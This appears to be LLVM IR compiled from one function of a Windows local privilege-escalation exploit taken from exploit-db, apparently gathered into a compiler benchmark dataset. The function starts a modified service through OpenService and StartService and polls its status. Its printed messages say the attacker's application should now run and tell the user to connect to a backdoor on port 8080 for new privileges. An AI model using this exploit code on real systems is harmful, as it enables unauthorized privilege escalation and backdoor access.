; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_1465.c_StartModifiedService.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_1465.c_StartModifiedService.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_3__ = type { i32, i64, i32 }

@SERVICE_ALL_ACCESS = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [45 x i8] c"[-] Unable to reopen service for starting..\0A\00", align 1
@.str.1 = private unnamed_addr constant [61 x i8] c"[+] Service Opened. Trying to Start... (wait a few seconds)\0A\00", align 1
@.str.2 = private unnamed_addr constant [70 x i8] c"[+] StarteService() Error due to a non service application execution\0A\00", align 1
@.str.3 = private unnamed_addr constant [55 x i8] c"[+] Ignore it. Your application should be executed =)\0A\00", align 1
@BACKDOOR = common dso_local global i64 0, align 8
@.str.4 = private unnamed_addr constant [60 x i8] c"[+] Now connect to port 8080 and enjoy your new privileges\0A\00", align 1
@.str.5 = private unnamed_addr constant [32 x i8] c"[-] Unable to start Service :/\0A\00", align 1
@.str.6 = private unnamed_addr constant [27 x i8] c"[+]  Starting Service....\0A\00", align 1
@SC_STATUS_PROCESS_INFO = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [39 x i8] c"[-] Unable to QueryServiceStatusEx() \0A\00", align 1
@SERVICE_START_PENDING = common dso_local global i64 0, align 8
@.str.8 = private unnamed_addr constant [15 x i8] c"Wait Time: %i\0A\00", align 1
@.str.9 = private unnamed_addr constant [35 x i8] c"el servicio no se ha arrancado...\0A\00", align 1
@SERVICE_RUNNING = common dso_local global i64 0, align 8
@.str.10 = private unnamed_addr constant [27 x i8] c"[+] StartService SUCCESS.\0A\00", align 1
@.str.11 = private unnamed_addr constant [28 x i8] c"\0A[-] Service not started. \0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @StartModifiedService(i32* %0, i8* %1, i64 %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i32*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.TYPE_3__, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32* %0, i32** %5, align 8
  store i8* %1, i8** %6, align 8
  store i64 %2, i64* %7, align 8
  %15 = load i32*, i32** %5, align 8
  %16 = load i8*, i8** %6, align 8
  %17 = load i32, i32* @SERVICE_ALL_ACCESS, align 4
  %18 = call i32* @OpenService(i32* %15, i8* %16, i32 %17)
  store i32* %18, i32** %8, align 8
  %19 = load i32*, i32** %8, align 8
  %20 = icmp eq i32* %19, null
  br i1 %20, label %21, label %27

21:                                               ; preds = %3
  %22 = load i64, i64* %7, align 8
  %23 = icmp ne i64 %22, 0
  br i1 %23, label %24, label %26

24:                                               ; preds = %21
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str, i64 0, i64 0))
  br label %26

26:                                               ; preds = %24, %21
  store i32 -1, i32* %4, align 4
  br label %166

27:                                               ; preds = %3
  %28 = load i64, i64* %7, align 8
  %29 = icmp ne i64 %28, 0
  br i1 %29, label %30, label %32

30:                                               ; preds = %27
  %31 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.1, i64 0, i64 0))
  br label %32

32:                                               ; preds = %30, %27
  br label %33

33:                                               ; preds = %32
  %34 = load i32*, i32** %8, align 8
  %35 = call i32 @StartService(i32* %34, i32 0, i32* null)
  %36 = icmp ne i32 %35, 0
  br i1 %36, label %63, label %37

37:                                               ; preds = %33
  %38 = call i32 (...) @GetLastError()
  store i32 %38, i32* %9, align 4
  %39 = load i32, i32* %9, align 4
  %40 = icmp eq i32 %39, 1053
  br i1 %40, label %41, label %53

41:                                               ; preds = %37
  %42 = load i64, i64* %7, align 8
  %43 = icmp ne i64 %42, 0
  br i1 %43, label %44, label %52

44:                                               ; preds = %41
  %45 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.2, i64 0, i64 0))
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.3, i64 0, i64 0))
  %47 = load i64, i64* @BACKDOOR, align 8
  %48 = icmp ne i64 %47, 0
  br i1 %48, label %49, label %51

49:                                               ; preds = %44
  %50 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.4, i64 0, i64 0))
  br label %51

51:                                               ; preds = %49, %44
  br label %52

52:                                               ; preds = %51, %41
  br label %62

53:                                               ; preds = %37
  %54 = load i64, i64* %7, align 8
  %55 = icmp ne i64 %54, 0
  br i1 %55, label %56, label %60

56:                                               ; preds = %53
  %57 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.5, i64 0, i64 0))
  %58 = load i32, i32* %9, align 4
  %59 = call i32 @doFormatMessage(i32 %58)
  br label %60

60:                                               ; preds = %56, %53
  %61 = load i32, i32* %9, align 4
  store i32 %61, i32* %4, align 4
  br label %166

62:                                               ; preds = %52
  br label %165

63:                                               ; preds = %33
  %64 = load i64, i64* %7, align 8
  %65 = icmp ne i64 %64, 0
  br i1 %65, label %66, label %68

66:                                               ; preds = %63
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.6, i64 0, i64 0))
  br label %68

68:                                               ; preds = %66, %63
  %69 = load i32*, i32** %8, align 8
  %70 = load i32, i32* @SC_STATUS_PROCESS_INFO, align 4
  %71 = call i32 @QueryServiceStatusEx(i32* %69, i32 %70, %struct.TYPE_3__* %10, i32 24, i32* %11)
  %72 = icmp ne i32 %71, 0
  br i1 %72, label %79, label %73

73:                                               ; preds = %68
  %74 = load i64, i64* %7, align 8
  %75 = icmp ne i64 %74, 0
  br i1 %75, label %76, label %78

76:                                               ; preds = %73
  %77 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.7, i64 0, i64 0))
  br label %78

78:                                               ; preds = %76, %73
  store i32 -2, i32* %4, align 4
  br label %166

79:                                               ; preds = %68
  %80 = call i32 (...) @GetTickCount()
  store i32 %80, i32* %13, align 4
  %81 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %10, i32 0, i32 0
  %82 = load i32, i32* %81, align 8
  store i32 %82, i32* %12, align 4
  br label %83

83:                                               ; preds = %143, %79
  %84 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %10, i32 0, i32 1
  %85 = load i64, i64* %84, align 8
  %86 = load i64, i64* @SERVICE_START_PENDING, align 8
  %87 = icmp eq i64 %85, %86
  br i1 %87, label %88, label %144

88:                                               ; preds = %83
  %89 = load i64, i64* %7, align 8
  %90 = icmp ne i64 %89, 0
  br i1 %90, label %91, label %95

91:                                               ; preds = %88
  %92 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %10, i32 0, i32 2
  %93 = load i32, i32* %92, align 8
  %94 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.8, i64 0, i64 0), i32 %93)
  br label %95

95:                                               ; preds = %91, %88
  %96 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %10, i32 0, i32 2
  %97 = load i32, i32* %96, align 8
  %98 = sdiv i32 %97, 10
  store i32 %98, i32* %14, align 4
  %99 = load i32, i32* %14, align 4
  %100 = icmp slt i32 %99, 1000
  br i1 %100, label %101, label %102

101:                                              ; preds = %95
  store i32 1000, i32* %14, align 4
  br label %107

102:                                              ; preds = %95
  %103 = load i32, i32* %14, align 4
  %104 = icmp sgt i32 %103, 10000
  br i1 %104, label %105, label %106

105:                                              ; preds = %102
  store i32 10000, i32* %14, align 4
  br label %106

106:                                              ; preds = %105, %102
  br label %107

107:                                              ; preds = %106, %101
  %108 = load i32, i32* %14, align 4
  %109 = call i32 @Sleep(i32 %108)
  %110 = load i32*, i32** %8, align 8
  %111 = load i32, i32* @SC_STATUS_PROCESS_INFO, align 4
  %112 = call i32 @QueryServiceStatusEx(i32* %110, i32 %111, %struct.TYPE_3__* %10, i32 24, i32* %11)
  %113 = icmp ne i32 %112, 0
  br i1 %113, label %120, label %114

114:                                              ; preds = %107
  %115 = load i64, i64* %7, align 8
  %116 = icmp ne i64 %115, 0
  br i1 %116, label %117, label %119

117:                                              ; preds = %114
  %118 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.7, i64 0, i64 0))
  br label %119

119:                                              ; preds = %117, %114
  store i32 -2, i32* %4, align 4
  br label %166

120:                                              ; preds = %107
  %121 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %10, i32 0, i32 0
  %122 = load i32, i32* %121, align 8
  %123 = load i32, i32* %12, align 4
  %124 = icmp sgt i32 %122, %123
  br i1 %124, label %125, label %129

125:                                              ; preds = %120
  %126 = call i32 (...) @GetTickCount()
  store i32 %126, i32* %13, align 4
  %127 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %10, i32 0, i32 0
  %128 = load i32, i32* %127, align 8
  store i32 %128, i32* %12, align 4
  br label %143

129:                                              ; preds = %120
  %130 = call i32 (...) @GetTickCount()
  %131 = load i32, i32* %13, align 4
  %132 = sub nsw i32 %130, %131
  %133 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %10, i32 0, i32 2
  %134 = load i32, i32* %133, align 8
  %135 = icmp sgt i32 %132, %134
  br i1 %135, label %136, label %142

136:                                              ; preds = %129
  %137 = load i64, i64* %7, align 8
  %138 = icmp ne i64 %137, 0
  br i1 %138, label %139, label %141

139:                                              ; preds = %136
  %140 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.9, i64 0, i64 0))
  br label %141

141:                                              ; preds = %139, %136
  br label %144

142:                                              ; preds = %129
  br label %143

143:                                              ; preds = %142, %125
  br label %83

144:                                              ; preds = %141, %83
  br label %145

145:                                              ; preds = %144
  %146 = load i32*, i32** %8, align 8
  %147 = call i32 @CloseServiceHandle(i32* %146)
  %148 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %10, i32 0, i32 1
  %149 = load i64, i64* %148, align 8
  %150 = load i64, i64* @SERVICE_RUNNING, align 8
  %151 = icmp eq i64 %149, %150
  br i1 %151, label %152, label %158

152:                                              ; preds = %145
  %153 = load i64, i64* %7, align 8
  %154 = icmp ne i64 %153, 0
  br i1 %154, label %155, label %157

155:                                              ; preds = %152
  %156 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.10, i64 0, i64 0))
  br label %157

157:                                              ; preds = %155, %152
  store i32 1, i32* %4, align 4
  br label %166

158:                                              ; preds = %145
  %159 = load i64, i64* %7, align 8
  %160 = icmp ne i64 %159, 0
  br i1 %160, label %161, label %163

161:                                              ; preds = %158
  %162 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.11, i64 0, i64 0))
  br label %163

163:                                              ; preds = %161, %158
  br label %164

164:                                              ; preds = %163
  br label %165

165:                                              ; preds = %164, %62
  store i32 0, i32* %4, align 4
  br label %166

166:                                              ; preds = %165, %157, %119, %78, %60, %26
  %167 = load i32, i32* %4, align 4
  ret i32 %167
}

declare dso_local i32* @OpenService(i32*, i8*, i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @StartService(i32*, i32, i32*) #1

declare dso_local i32 @GetLastError(...) #1

declare dso_local i32 @doFormatMessage(i32) #1

declare dso_local i32 @QueryServiceStatusEx(i32*, i32, %struct.TYPE_3__*, i32, i32*) #1

declare dso_local i32 @GetTickCount(...) #1

declare dso_local i32 @Sleep(i32) #1

declare dso_local i32 @CloseServiceHandle(i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
